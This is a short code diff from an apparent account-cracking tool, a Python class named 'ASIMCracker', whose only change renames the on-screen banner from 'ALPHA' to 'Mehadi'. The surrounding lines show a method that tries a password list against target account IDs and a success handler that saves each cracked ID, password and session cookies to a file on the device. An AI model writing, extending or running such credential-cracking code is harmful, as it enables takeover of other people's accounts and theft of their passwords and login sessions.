@@ -602,7 +602,7 @@ class ASIMCracker:
 
     def breach_target(self, target, passlist):
         self.loop += 1
-        sys.stdout.write(f'\r  {self.color.W}[ALPHA] {self.loop}|{self.color.R}{len(self.oks)}|{self.color.G}{len(self.cps)}{self.color.W}')
+        sys.stdout.write(f'\r  {self.color.W}[Mehadi] {self.loop}|{self.color.R}{len(self.oks)}|{self.color.G}{len(self.cps)}{self.color.W}')
         sys.stdout.flush()
 
         for password in passlist:
@@ -698,7 +698,7 @@ class ASIMCracker:
 
     def handle_success(self, uid, password, response):
         coki = ';'.join([f"{c['name']}={c['value']}" for c in response.get('session_cookies', [])])
-        print(f'\r  {self.color.G}\x1b[1;96m   ➤ ALPHA {self.color.W}{uid}|{self.color.G}{password}{self.color.W}')
+        print(f'\r  {self.color.G}\x1b[1;96m   ➤ Mehadi {self.color.W}{uid}|{self.color.G}{password}{self.color.W}')
         with open('/sdcard/ASIM-OLD.txt', 'a') as f:
             f.write(f'{uid}|{password}|{coki}\n')
         self.oks.append(uid)
